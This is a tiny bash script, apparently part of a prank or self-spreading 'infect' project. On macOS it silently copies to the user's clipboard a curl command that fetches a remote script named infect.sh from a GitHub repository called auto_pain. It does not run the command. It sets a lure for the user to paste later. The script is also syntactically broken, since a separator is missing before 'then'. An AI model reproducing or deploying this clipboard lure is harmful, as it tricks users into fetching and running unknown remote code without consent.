#!/usr/bin/bash

OS=$(uname -s)

if [ "$OS" == "Darwin" ] then
	echo curl https://raw.githubusercontent.com/c8p2d01/auto_pain/main/infect.sh | pbcopy #MAC
fi